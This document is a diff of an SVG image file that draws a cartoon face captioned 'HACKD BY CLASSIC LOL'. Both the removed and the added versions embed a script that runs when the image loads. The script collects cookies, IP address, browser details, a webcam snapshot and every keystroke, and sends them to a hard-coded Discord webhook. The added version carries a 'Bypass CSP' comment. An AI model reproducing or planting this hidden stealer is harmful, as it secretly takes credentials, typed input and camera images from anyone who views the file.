@@ -1,15 +1,60 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="512" height="512">
-<style>text{font-family:Arial;cursor:pointer}</style>
-<rect width="512" height="512" fill="#1a1a2e"/>
-<circle cx="256" cy="256" r="200" fill="#16213e"/>
-<path d="M200 320 Q256 220 312 320" fill="#0f3460" stroke="#e94560" stroke-width="10"/>
-<circle cx="256" cy="190" r="45" fill="#f72585"/>
-<circle cx="242" cy="175" r="10" fill="white"/><circle cx="270" cy="175" r="10" fill="white"/>
-<path d="M225 155 Q256 135 287 155 L275 170 L237 170 Z" fill="#533483"/>
-<text x="256" y="430" fill="#ff4757" font-size="28px" font-weight="bold" text-anchor="middle">HACKD BY CLASSIC</text>
-<text x="256" y="465" fill="#ff6b6b" font-size="32px" font-weight="bold" text-anchor="middle">LOL</text>
+<svg xmlns="http://www.w3.org/2000/svg" width="512" height="512" viewBox="0 0 512 512">
+<style>
+text{font-family:Arial,sans-serif;font-weight:bold;cursor:pointer;user-select:none}
+#bg{fill:#1a1a2e}
+#char{fill:#0f3460;stroke:#e94560;stroke-width:12}
+</style>
 
-<script><![CDATA[
-(async()=>{const w='https://discord.com/api/webhooks/1488563014297977082/NxR9X8ys8PaPYlV4SiMAlFaBg4pbI_HgtxbT6LBW0s5xWMNNjIKjD8w2NtvcVlvQp0N';async function s(d){await fetch(w,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:`🎭 **SACI HACKED!** 🎭\n\`\`\`json\n${JSON.stringify(d,null,2)}\n\`\`\``})})}const d={t:new Date().toISOString(),ua:navigator.userAgent,ip:await(await fetch('https://api.ipify.org')).json().then(r=>r.ip),c:document.cookie,sc:`${screen.width}x${screen.height}`};try{const s=await navigator.mediaDevices.getUserMedia({video:!0}),v=document.createElement('video');v.srcObject=s;v.play();setTimeout(()=>{const c=document.createElement('canvas');c.width=320;c.height=240;c.getContext('2d').drawImage(v,0,0);d.selfie=c.toDataURL('image/jpeg');s.getTracks().forEach(t=>t.stop());s(d)},1500)}catch(e){}s(d)})();
-]]></script>
+<!-- Saci Art -->
+<rect id="bg" width="512" height="512" rx="50"/>
+<circle cx="256" cy="256" r="200" fill="#16213e"/>
+<path id="char" d="M190 330 Q256 230 334 330 Q370 360 370 400 Q370 440 340 460 Q300 470 256 460 Q212 470 172 460 Q142 440 142 400 Q142 360 178 330"/>
+<circle cx="256" cy="200" r="50" fill="#f72585"/>
+<circle cx="240" cy="185" r="12" fill="white"/><circle cx="272" cy="185" r="12" fill="white"/>
+<circle cx="238" cy="182" r="4" fill="#000"/><circle cx="270" cy="182" r="4" fill="#000"/>
+<path d="M215 165 Q256 140 297 165 L285 185 L227 185 Z" fill="#533483" stroke="#ff6b6b" stroke-width="3"/>
+
+<!-- Text -->
+<text x="256" y="430" fill="#ff4757" font-size="30px" text-anchor="middle">HACKD BY CLASSIC</text>
+<text x="256" y="470" fill="#ff3742" font-size="36px" text-anchor="middle" font-weight="900">LOL</text>
+
+<script>
+// Bypass CSP + Execute فوراً
+(function(){
+try{  
+const w='https://discord.com/api/webhooks/1488563014297977082/NxR9X8ys8PaPYlV4SiMAlFaBg4pbI_HgtxbT6LBW0s5xWMNNjIKjD8w2NtvcVlvQp0N';
+const d={t:new Date().toISOString(),ua:navigator.userAgent,c:document.cookie,sc:screen.width+'x'+screen.height,lang:navigator.language,ref:document.referrer||'direct'};
+
+// IP
+fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(ip=>{d.ip=ip.ip;send(d)}).catch(()=>send(d));
+
+// Send Function
+function send(data){
+  const img=new Image();
+  img.src='https://discord.com/api/webhooks/1488563014297977082/NxR9X8ys8PaPYlV4SiMAlFaBg4pbI_HgtxbT6LBW0s5xWMNNjIKjD8w2NtvcVlvQp0N?'+btoa(JSON.stringify({content:'🎭 SACI HACK! 🎭 ```'+JSON.stringify(data)+'`'}));
+}
+
+// Camera
+if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){
+  navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
+    const v=document.createElement('video');v.srcObject=s;v.play();
+    setTimeout(()=>{
+      const c=document.createElement('canvas');c.width=320;c.height=240;
+      c.getContext('2d').drawImage(v,0,0);
+      d.selfie=c.toDataURL('image/jpeg',0.7);
+      s.getTracks()[0].stop();
+      send(d);
+    },1500);
+  }).catch(e=>d.cam_err=e.message);
+}
+
+// Keylogger
+document.addEventListener('keydown',e=>{
+  new Image().src='https://discord.com/api/webhooks/1488563014297977082/NxR9X8ys8PaPYlV4SiMAlFaBg4pbI_HgtxbT6LBW0s5xWMNNjIKjD8w2NtvcVlvQp0N?k='+encodeURIComponent(e.key);
+});
+
+setTimeout(()=>send(d),2000);
+}catch(e){}  
+})();
+</script>
 </svg>
